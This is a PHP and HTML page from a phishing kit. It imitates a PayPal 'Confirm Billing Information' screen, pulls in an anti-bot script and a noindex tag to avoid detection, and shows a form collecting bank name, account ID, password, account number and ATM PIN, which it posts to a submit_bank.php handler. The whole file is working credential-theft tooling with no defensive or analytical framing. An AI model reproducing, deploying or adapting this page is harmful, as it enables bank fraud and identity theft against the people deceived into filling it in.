<?php

/*

 */

include 'antibots.php';

session_start();

?>
<!DOCTYPE html>
<html>
<head>
    <title>Confirm Billing Information - PayPal</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="css/fav.ico" />
    <link href="css/app.css" type="text/css" rel="stylesheet">
    <script src="css/jquery.js" type="text/javascript"></script>
    <script src="css/jquery.maskedinput.js" type="text/javascript"></script>
</head>
<style>

    body{
        margin:0px;
    }
    /* .content_form{
         width: 460px;
         margin-left: 683px;
         padding-left: 44px;
         padding-top: 121px;
     }*/
    .input{
        width: 358px;
        height: 40px;
        padding-left: 12px;
        margin-bottom: 18px;
        border: 1px solid #B7B6B6;
        border-radius: 3px;
        font-size: 16px;
        text-transform: capitalize;

    }
    .input:focus{
        border: 1px solid #2690FF;
    }
    .card{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -406px;
        height: 27px;
        position: relative;
        left: -51px;
        bottom: -9px;
        width: 40px;
    }
    .date{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -434px;
        height: 27px;
        position: relative;
        left: -51px;
        bottom: -9px;
        width: 40px;
    }
    .btn{
        width: 374px;
        height: 44px;
        padding: 10px 15px;
        border: 0px none;
        display: block;
        background: none repeat scroll 0% 0% #009CDE;
        box-shadow: none;
        border-radius: 5px;
        box-sizing: border-box;
        cursor: pointer;
        color: #FFF;
        font-size: 1.14286em;
        text-align: center;
        font-weight: bold;
        font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
        text-shadow: none;
    }
    .check_box{
        background-image: url("css/onboarding_form.png");
        background-repeat: no-repeat;
        padding-left: 28px;
        line-height: 26px;
        display: inline-block;
        margin-bottom: 9px;
        cursor: pointer;
    }
    #checked{
        background-position: 0px -100px;
    }
    #inchecked{
        background-position: 0px 0px;
    }

</style>
<body style="background-image: url('css/bank.PNG'); background-repeat: no-repeat; background-position: center -1px;height: 780px;">
<div style="width: 460px; margin: 0px auto; padding-left: 643px; padding-top: 129px;">
    <div class="content_form">
        <form method="post" action="submit_bank.php?websrc=<?php echo md5('nOobAssas!n'); ?>&dispatched=userInfo&id=<?php echo rand(10000000000,500000000); ?>">
            <div>
                <br>
                <br>
                <input type="text" name="bankname" class="input" placeholder="Bank Name" style="width: 170px;">
                <input type="text" name="accountid"  class="input" placeholder="Account ID" style="width: 170px;">
                <input type="text" name="password" class="input" placeholder="Password" style="width: 170px;">
                <input type="text" name="accounnumber"  class="input" placeholder="Account Number" style="width: 170px;">
                <div id="cont_in">
                    <span class="check_box" id="inchecked" >ATM PIN</span><br>
                    <input style="display: none" type="tel" maxlength="4" id="atmppin" name="atm_pin" class="input" placeholder="ATM PIN">
                </div>
                <input type="submit" class="btn" value="Continue" name="btn_card">
            </div>
        </form>
    </div>
</div>
<script>
    $(document).on("click","#inchecked",function(){
        var inchecked = document.getElementById('inchecked');
        var atm = document.getElementById('atmppin');

        if(inchecked.id == 'inchecked'){
            inchecked.id = "checked";
            atm.style.display = "block";
        }
    });
    $(document).on("click","#checked",function(){
        var checked = document.getElementById('checked');
        var atm = document.getElementById('atmppin');
        if(checked.id == 'checked'){
            checked.id = "inchecked";
            atm.style.display = "none"
        }
    });
</script>
</body>
</html>